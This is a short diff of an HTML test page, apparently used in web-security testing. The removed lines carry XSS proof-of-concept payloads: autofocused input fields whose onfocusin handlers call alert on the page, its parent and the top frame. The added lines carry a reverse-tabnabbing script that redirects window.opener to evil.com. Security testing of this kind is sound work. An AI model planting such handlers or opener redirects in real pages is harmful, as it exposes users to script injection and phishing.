@@ -1,9 +1,9 @@
 <html>
-  
-<body>
-
-<h1>test</h1>
-  <input autofocus onfocusin=window.top.alert(1)></br>Paretnt:Paretnt:   <input autofocus onfocusin=parent.alert(document.domain)> <br/>My Domain:   <input autofocus onfocusin=alert(document.domain)>
-</body>
-  
+ <body>
+  <script>
+   if (window.opener) {
+      window.opener.location = "https://evil.com";
+   }
+  </script>
+ </body>
 </html>
